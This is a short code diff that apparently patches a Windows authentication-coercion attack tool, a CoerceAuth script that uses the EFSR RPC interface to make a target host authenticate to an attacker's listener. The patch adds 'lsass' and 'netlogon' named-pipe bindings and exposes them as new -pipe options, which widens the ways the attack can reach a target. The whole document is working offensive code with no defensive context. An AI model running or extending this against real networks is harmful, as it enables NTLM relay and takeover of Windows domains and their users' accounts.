@@ -95,6 +95,14 @@ class CoerceAuth():
                 'stringBinding': r'ncacn_np:%s[\PIPE\samr]' % target,
                 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
             },
+            'lsass': {
+                'stringBinding': r'ncacn_np:%s[\PIPE\lsass]' % target,
+                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
+            },
+            'netlogon': {
+                'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]' % target,
+                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
+            },
         }
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
         if hasattr(rpctransport, 'set_credentials'):
@@ -102,7 +110,7 @@ class CoerceAuth():
         dce = rpctransport.get_dce_rpc()
         #dce.set_auth_type(RPC_C_AUTHN_WINNT)
         #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-        print("[-] Connecting to %s!" % target)
+        print("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
         try:
             dce.connect()
         except Exception as e:
@@ -142,7 +150,7 @@ def main():
     parser.add_argument('-p', '--password', action="store", default='', help='valid password')
     parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
     parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
-    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr'], default='lsarpc', help='Named pipe to use (default: lsarpc)')
+    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass'], default='lsarpc', help='Named pipe to use (default: lsarpc)')
     parser.add_argument('listener', help='ip address or hostname of listener')
     parser.add_argument('target', help='ip address or hostname of target')
     options = parser.parse_args()
